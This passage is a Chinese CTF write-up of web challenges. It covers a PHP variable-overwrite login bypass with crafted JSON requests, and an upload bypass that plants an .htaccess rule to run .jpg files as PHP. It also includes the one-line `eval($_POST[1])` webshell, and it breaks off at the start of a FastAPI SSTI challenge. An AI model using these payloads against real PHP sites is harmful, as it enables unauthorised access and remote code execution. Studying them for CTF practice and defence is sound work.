<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/<span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span>.php</span><br><span class="line">记得需要url编码</span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/2025%E7%8E%84%E6%AD%A6%E6%9D%AF/image-20251103101028951.png" alt="image-20251103101028951"></p>
<h2 id="ez-file"><a href="#ez-file" class="headerlink" title="ez_file"></a>ez_file</h2><h3 id="变量覆盖-文件上传"><a href="#变量覆盖-文件上传" class="headerlink" title="#变量覆盖+文件上传"></a>#变量覆盖+文件上传</h3><p>依旧yxing师傅的题</p>
<p>扫目录拿到<a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a></p>
<p>先看login.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#悄悄的，校内赛道第一个找到学长的秘密的私信学长秘密内容给奶茶喝</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">#header(&#x27;Content-Type: application/json&#x27;);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$params</span> = [];</span><br><span class="line"><span class="variable">$role</span> = <span class="string">&quot;guest&quot;</span>;</span><br><span class="line"><span class="variable">$admin_role</span> = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;CONTENT_TYPE&quot;</span>] , <span class="string">&quot;application/json&quot;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="variable">$raw</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$raw</span>, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">json_last_error</span>() === JSON_ERROR_NONE) &#123;</span><br><span class="line">        <span class="variable">$params</span> = <span class="variable">$data</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$params</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">            <span class="variable">$$key</span> = <span class="variable">$value</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;Invalid JSON&quot;</span>]);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 如果是普通表单请求</span></span><br><span class="line"><span class="keyword">elseif</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_METHOD&quot;</span>] === <span class="string">&quot;POST&quot;</span>) &#123;</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] ;</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>] ;</span><br><span class="line"><span class="comment">//    $params = [&#x27;username&#x27; =&gt; $username, &#x27;password&#x27; =&gt; $password];</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;Unsupported request method&quot;</span>]);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$client_ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] ;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$username</span> === <span class="string">&quot;admin&quot;</span> &amp;&amp; <span class="variable">$password</span> === <span class="string">&quot;456789&quot;</span> &amp;&amp; <span class="variable">$client_ip</span> === <span class="string">&quot;127.0.0.1&quot;</span>) &#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;role&#x27;</span>] = <span class="variable">$admin_role</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">        <span class="string">&quot;status&quot;</span> =&gt; <span class="string">&quot;success&quot;</span>,</span><br><span class="line">        <span class="string">&quot;message&quot;</span> =&gt; <span class="string">&quot;Login successful (local admin)&quot;</span>,</span><br><span class="line">        <span class="string">&quot;ip&quot;</span> =&gt; <span class="variable">$client_ip</span></span><br><span class="line">    ]);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: index.php&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$username</span> === <span class="string">&quot;guest&quot;</span> &amp;&amp; <span class="variable">$password</span> === <span class="string">&quot;123456&quot;</span>) &#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;role&#x27;</span>] = <span class="variable">$role</span>;</span><br><span class="line">    <span class="comment">#echo $role;</span></span><br><span class="line">    <span class="comment">#echo json_encode([&quot;status&quot; =&gt; &quot;success&quot;, &quot;message&quot; =&gt; &quot;Login successful&quot;, &quot;user&quot; =&gt; $username]);</span></span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: index.php&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">http_response_code</span>(<span class="number">401</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">&quot;status&quot;</span> =&gt; <span class="string">&quot;failed&quot;</span>, <span class="string">&quot;message&quot;</span> =&gt; <span class="string">&quot;Invalid username or password&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>有guest和admin，<code>$$key = $value</code>存在明显的变量覆盖，通过检测CONTENT_TYPE的值来判断是普通请求还是变量覆盖</p>
<p>这里的话登录有两个方法，一个是admin，一个是guest</p>
<p>index.php中有一段身份验证的代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="variable">$secret</span> = <span class="title function_ invoke__">rtrim</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/secret&quot;</span>), <span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;secret&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;secret&#x27;</span>] !== <span class="variable">$secret</span>) &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.html&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;role&#x27;</span>]) || <span class="variable">$_SESSION</span>[<span class="string">&#x27;role&#x27;</span>] !== <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.html&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们需要让session的role为admin才能登录进去</p>
<p>所以这里有两条路可以走</p>
<ol>
<li>通过admin登录，可以设置$client_ip的值为127.0.0.1，这样就能让role为admin_role</li>
<li>通过guest登录，可以设置$role为admin，这样同样也能让role为admin_role</li>
</ol>
<p>guest登录的请求包</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/login.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>node10.anna.nssctf.cn:22598</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>Hm_lvt_648a44a949074de73151ffaa0a832aec=1762060097,1762082656,1762089964,1762135089; HMACCOUNT=85A7446944A123A0; Hm_lpvt_648a44a949074de73151ffaa0a832aec=1762135903; PHPSESSID=c06a175391e8d4d4b383c59d09d19265</span><br><span class="line"><span class="attribute">If-None-Match</span><span class="punctuation">: </span>&quot;5f4-6424b53318a80-gzip&quot;</span><br><span class="line"><span class="attribute">If-Modified-Since</span><span class="punctuation">: </span>Wed, 29 Oct 2025 12:32:26 GMT</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>94</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span></span></span><br><span class="line"><span class="language-json"><span class="attr">&quot;_SERVER&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span></span><br><span class="line"><span class="language-json"><span class="attr">&quot;REMOTE_ADDR&quot;</span><span class="punctuation">:</span> <span class="string">&quot;127.0.0.1&quot;</span></span></span><br><span class="line"><span class="language-json"><span class="punctuation">&#125;</span><span class="punctuation">,</span></span></span><br><span class="line"><span class="language-json"><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;admin&quot;</span><span class="punctuation">,</span></span></span><br><span class="line"><span class="language-json"><span class="attr">&quot;password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;456789&quot;</span></span></span><br><span class="line"><span class="language-json"><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/2025%E7%8E%84%E6%AD%A6%E6%9D%AF/image-20251103102934526.png" alt="image-20251103102934526"></p>
<p>然后访问index.php就行了</p>
<p>admin登录的请求包</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/login.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>node10.anna.nssctf.cn:22598</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>Hm_lvt_648a44a949074de73151ffaa0a832aec=1762060097,1762082656,1762089964,1762135089; HMACCOUNT=85A7446944A123A0; Hm_lpvt_648a44a949074de73151ffaa0a832aec=1762135903; PHPSESSID=c06a175391e8d4d4b383c59d09d19265</span><br><span class="line"><span class="attribute">If-None-Match</span><span class="punctuation">: </span>&quot;5f4-6424b53318a80-gzip&quot;</span><br><span class="line"><span class="attribute">If-Modified-Since</span><span class="punctuation">: </span>Wed, 29 Oct 2025 12:32:26 GMT</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>65</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span></span></span><br><span class="line"><span class="language-json"><span class="attr">&quot;role&quot;</span><span class="punctuation">:</span><span class="string">&quot;admin&quot;</span><span class="punctuation">,</span></span></span><br><span class="line"><span class="language-json"><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;guest&quot;</span><span class="punctuation">,</span></span></span><br><span class="line"><span class="language-json"><span class="attr">&quot;password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;123456&quot;</span></span></span><br><span class="line"><span class="language-json"><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure>

<p>会302跳转到index.php</p>
<p>然后我们来看index.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_METHOD&quot;</span>] == <span class="string">&quot;POST&quot;</span>) &#123;</span><br><span class="line">        <span class="variable">$fileType</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">pathinfo</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>], PATHINFO_EXTENSION));</span><br><span class="line"></span><br><span class="line">        <span class="variable">$data</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$type</span> = <span class="title function_ invoke__">mime_content_type</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] &gt; <span class="number">1000</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;file too large&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">#文件后缀白名单检测，我就不信你还能上传php文件，嘻嘻嘻</span></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$fileType</span>, [<span class="string">&quot;jpg&quot;</span>,<span class="string">&quot;png&quot;</span>,<span class="string">&quot;gif&quot;</span>,<span class="string">&quot;jpeg&quot;</span>]))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;file type not allow&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;./uploads/&quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]).<span class="string">&quot;.jpg&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;upload success&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;upload to ./uploads/&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]).<span class="string">&quot;.jpg&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;upload failed&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="variable">$black_list</span>=[<span class="string">&quot;php&quot;</span>, <span class="string">&quot;phtml&quot;</span>, <span class="string">&quot;php3&quot;</span>, <span class="string">&quot;php4&quot;</span>, <span class="string">&quot;php5&quot;</span>, <span class="string">&quot;pht&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;old_name&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;new_name&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$name</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">pathinfo</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;new_name&#x27;</span>], PATHINFO_EXTENSION));</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$name</span>,<span class="variable">$black_list</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;我不想看到php文件&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$data</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;old_name&#x27;</span>]);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$data</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;怎么没有东西，这我改什么&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$file</span> = <span class="title function_ invoke__">tmpfile</span>();</span><br><span class="line">        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$file</span>, <span class="variable">$data</span>);</span><br><span class="line">        <span class="title function_ invoke__">fflush</span>(<span class="variable">$file</span>);</span><br><span class="line">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;./uploads/&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;new_name&#x27;</span>],<span class="variable">$data</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;文件重命名成功&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>有文件后缀名白名单检测，并且上传文件后会更名为md5加密的jpg文件</p>
<p>后面是一个重命名的操作，不过设置了php黑名单</p>
<p>思路就是通过上传一个.htaccess内容的jpg文件，并重命名为.htaccess后缀触发解析，然后上传一个jpg文件利用.htaccess文件解析漏洞解析jpg里面的php代码</p>
<p>.htaccess文件的内容</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg </span><br></pre></td></tr></table></figure>

<p>更名为jpg后缀并上传返回文件路径&#x2F;uploads&#x2F;f3ccdd27d2000e3f9255a7e3e2c48800.jpg</p>
<p>进行重命名</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?old_name=uploads/f3ccdd27d2000e3f9255a7e3e2c48800.jpg&amp;new_name=.htaccess</span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/2025%E7%8E%84%E6%AD%A6%E6%9D%AF/image-20251103104052595.png" alt="image-20251103104052595"></p>
<p>随后上传一个一句话木马命名为jpg后缀就行了</p>
<p><img src="/../image/achieve/202411/2025%E7%8E%84%E6%AD%A6%E6%9D%AF/image-20251103104145632.png" alt="image-20251103104145632"></p>
<h2 id="ez-fastapi"><a href="#ez-fastapi" class="headerlink" title="ez_fastapi"></a>ez_fastapi</h2><h3 id="无回显SSTI"><a href="#无回显SSTI" class="headerlink" title="#无回显SSTI"></a>#无回显SSTI</h3><p>baozongwi师傅出的题</p>
<p>先看app.py文件</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> fastapi <span class="keyword">import</span> FastAPI, Request</span><br><span class="line"><span class="keyword">from</span> fastapi.responses <span class="keyword">import</span> HTMLResponse, JSONResponse</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Environment</span><br><span class="line"><span class="keyword">import</span> uvicorn</span><br><span class="line"></span><br><span class="line">app = FastAPI()</span><br><span class="line">Jinja2 = Environment()</span><br><span class="line"></span><br><span class="line">Jinja2 = Environment(</span><br><span class="line">    variable_start_string=<span class="string">&#x27;&#123;&#x27;</span>,</span><br><span class="line">    variable_end_string=<span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.exception_handler(<span class="params"><span class="number">404</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">handler_404</span>(<span class="params">request, exc</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;not found!&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> JSONResponse(</span><br><span class="line">        status_code=<span class="number">404</span>,</span><br><span class="line">        content=&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Not found&quot;</span>&#125;</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.middleware(<span class="params"><span class="string">&#x27;http&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">say_hello</span>(<span class="params">request: Request, call_next</span>):</span><br><span class="line">    response = <span class="keyword">await</span> call_next(request)</span><br><span class="line">    response.headers[<span class="string">&#x27;say1&#x27;</span>] = <span class="string">&#x27;hello!&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.middleware(<span class="params"><span class="string">&#x27;http&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">say_hi</span>(<span class="params">request: Request, call_next</span>):</span><br><span class="line">    response = <span class="keyword">await</span> call_next(request)</span><br><span class="line">    response.headers[<span class="string">&#x27;say2&#x27;</span>] = <span class="string">&#x27;hi!&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Hello World&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/shellMe&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">shellMe</span>(<span 